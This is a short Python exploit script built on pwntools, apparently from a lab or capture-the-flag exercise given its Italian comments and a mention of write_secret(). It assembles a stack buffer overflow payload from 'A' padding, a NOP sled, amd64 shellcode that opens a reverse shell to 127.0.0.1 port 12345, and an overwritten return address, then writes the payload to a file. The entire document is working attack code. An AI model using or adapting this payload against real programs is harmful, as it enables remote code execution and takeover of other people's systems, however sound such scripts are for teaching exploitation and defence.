from pwn import *
context.arch='amd64' # 64-bit version of x86
context.os='linux'

# Shellcode for opening a "reverse shell"
s_code = shellcraft.amd64.linux.connect('127.0.0.1', 12345) + shellcraft.amd64.linux.dupsh('rbp')
s_code_asm = asm(s_code)
print(len(s_code_asm))

# Return address in little-endian format
ret_addr = 0x00007FFFFFFFDA88 - 1575 + 1024 + 200 # indirizzo dello shellcode (oppure di write_secret())
addr = p64(ret_addr, endian='little')
print(addr)

# Opcode for the NOP instruction (for NOP sled)
nop = asm('nop')

# First part of the payload
payload = b"2\n" + b"A"*1022

# Second part of the payload
# riempitivo di NOP, shellcode # + addr
payload += nop*(1575 - 1024 - len(s_code_asm)- 64) + s_code_asm + nop*64 + addr
with open("./shellcode_payload", "wb") as f:
	f.write(payload)
